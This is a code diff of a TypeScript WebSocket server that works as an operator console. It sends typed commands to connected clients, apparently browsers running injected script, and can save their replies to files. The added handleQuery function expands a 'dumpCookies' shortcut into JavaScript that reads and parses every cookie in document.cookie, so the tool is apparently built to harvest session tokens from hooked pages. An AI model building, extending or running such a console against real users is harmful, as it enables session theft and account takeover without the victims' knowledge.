@@ -13,6 +13,25 @@ const fetchInput = async (doOnFetch: (res: string) => Promise<void>) => {
 const wss = new _WebSocket.Server({port: 8080});
 let shouldSave = false;
 let saveTo = '';
+
+const handleQuery = (query: string,ws) => {
+	if(query.includes('dumpCookies')) {
+		query = query.replace('dumpCookies', ' document.cookie.split(\'; \').reduce((prev, current) => {const [name, ...value] = current.split(\'=\');prev[name] = value.join(\'=\');return prev;}, {});');
+	}
+	if (query.includes('|')) {
+		shouldSave = true;
+		saveTo = query.split('|')[1];
+		ws.send(query.split('|')[0]);
+	} else {
+		if(query === 'clear') {
+			console.clear();
+		}
+		ws.send(query);
+		shouldSave = false;
+		saveTo = '';
+	}
+};
+
 export const startWsServer = async () => {
 	wss.on('connection', async (ws) => {
 		ws.on('message', async (message) => {
@@ -25,27 +44,20 @@ export const startWsServer = async () => {
 
 				}
 			} catch (e) {
-				console.error('Error processing response.');
-				console.log(JSON.parse(message).response);
+				console.error('Error processing response. ', message);
+				console.log(JSON.parse(message)?.response);
 
 			}
-			const query: string = await prompt('>');
-			if (query.includes('|')) {
-				ws.send(query.split('|')[0]);
-				shouldSave = true;
-				saveTo = query.split('|')[1];
-			} else {
-				ws.send(query);
-				shouldSave = false;
-				saveTo = '';
-			}
+			const query: string = await prompt('> ');
+			await handleQuery(query, ws);
 
 		});
 
 		ws.onclose = () => {
 			console.log('connection lost!..');
 		};
-		ws.send(await prompt('>'));
+		// ws.send(await prompt('> '));
+		handleQuery(await prompt('> '), ws);
 	});
 
 };
